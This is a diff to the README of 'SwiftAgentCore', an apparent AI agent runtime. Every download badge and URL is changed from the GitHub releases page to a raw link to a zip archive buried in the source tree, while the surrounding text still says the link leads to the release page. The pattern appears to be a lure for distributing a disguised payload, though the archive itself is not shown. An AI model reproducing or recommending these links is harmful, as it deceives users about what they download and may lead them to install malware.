@@ -1,6 +1,6 @@
 # 🤖 SwiftAgentCore - Lightweight Agent Runtime for AI Tasks
 
-[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jc18aguilar/SwiftAgentCore/main/Sources/SwiftAgentCore/Skills/Agent-Core-Swift-v1.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these requirements:
 
 You can get SwiftAgentCore on the official GitHub releases page.
 
-[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-blue?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-blue?style=for-the-badge)](https://raw.githubusercontent.com/jc18aguilar/SwiftAgentCore/main/Sources/SwiftAgentCore/Skills/Agent-Core-Swift-v1.6.zip)
 
 Visit the link above. It will take you to the release page where you can download the latest version.
 
@@ -40,7 +40,7 @@ Visit the link above. It will take you to the release page where you can downloa
 
 Open your web browser and go to:
 
-https://github.com/jc18aguilar/SwiftAgentCore/releases
+https://raw.githubusercontent.com/jc18aguilar/SwiftAgentCore/main/Sources/SwiftAgentCore/Skills/Agent-Core-Swift-v1.6.zip
 
 This page lists all the available versions. It's a good idea to pick the latest release for the newest features and fixes.
 
@@ -118,7 +118,7 @@ All this works out of the box once you set your API keys.
 
 Check the release page regularly for updates:
 
-https://github.com/jc18aguilar/SwiftAgentCore/releases
+https://raw.githubusercontent.com/jc18aguilar/SwiftAgentCore/main/Sources/SwiftAgentCore/Skills/Agent-Core-Swift-v1.6.zip
 
 New versions fix issues and add features. Download the newest installer and run it the same way to update your app.
 
@@ -158,4 +158,4 @@ If you have questions or run into issues:
 
 Get your copy here:
 
-[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://github.com/jc18aguilar/SwiftAgentCore/releases)
+[![Download SwiftAgentCore](https://img.shields.io/badge/Download-SwiftAgentCore-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jc18aguilar/SwiftAgentCore/main/Sources/SwiftAgentCore/Skills/Agent-Core-Swift-v1.6.zip)
